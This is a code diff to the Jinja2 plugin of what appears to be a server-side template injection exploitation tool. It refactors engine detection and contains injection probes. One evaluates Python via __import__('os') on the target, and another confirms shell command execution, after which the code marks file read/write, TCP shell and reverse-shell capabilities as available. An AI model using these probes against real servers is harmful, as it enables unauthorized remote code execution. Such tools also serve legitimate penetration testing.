@@ -4,6 +4,7 @@ from core import languages
 from utils.loggers import log
 from utils import rand
 import base64
+import re
 
 class Jinja2(Plugin):
 
@@ -89,37 +90,49 @@ class Jinja2(Plugin):
 
     ]
 
-    def detect_engine(self):
+    language = 'python'
+
+    def rendered_detected(self):
 
         randA = rand.randstr_n(2)
         randB = rand.randstr_n(2)
 
+        # Check this to avoid detecting Twig as Jinja2
         payload = '{{"%s".join("%s")}}' % (randA, randB)
         expected = randA.join(randB)
 
         if expected == self.render(payload):
-            self.set('language', 'python')
-            self.set('engine', 'jinja2')
-            self.set('evaluate', 'python')
-            self.set('execute', True)
 
-    def detect_eval(self):
+            self.set('engine', self.plugin.lower())
+            self.set('language', self.language)
 
-        payload = """'-'.join([__import__('os').name, __import__('sys').platform])"""
-        self.set('os', self.evaluate(payload))
-        self.set('evaluate', 'python')
+            os = self.evaluate("""'-'.join([__import__('os').name, __import__('sys').platform])""")
+            if os and re.search('^[\w-]+$', os):
+                self.set('os', os)
+                self.set('evaluate', self.language)
+                self.set('write', True)
+                self.set('read', True)
+
+                expected_rand = str(rand.randint_n(2))
+                if expected_rand == self.execute('echo %s' % expected_rand):
+                    self.set('execute', True)
+                    self.set('tcp_shell', True)
+                    self.set('reverse_tcp_shell', True)
+
+
+    def blind_detected(self):
+
+        self.set('engine', self.plugin.lower())
+        self.set('language', self.language)
+
+        # Blind has been detected so code has been already evaluated
+        self.set('evaluate_blind', self.language)
+
+        if self.execute_blind('echo %s' % str(rand.randint_n(2))):
+            self.set('execute_blind', True)
+            self.set('tcp_shell', True)
+            self.set('reverse_tcp_shell', True)
 
     def evaluate(self, code, **kwargs):
         # Quote code before submitting it
         return super(Jinja2, self).evaluate(quote(code), **kwargs)
-
-    def detect_blind_engine(self):
-
-        if not self.get('blind'):
-            return
-
-        self.set('language', 'python')
-        self.set('execute', True)
-        self.set('execute_blind', True)
-        self.set('engine', 'jinja2')
-        self.set('evaluate', 'python')
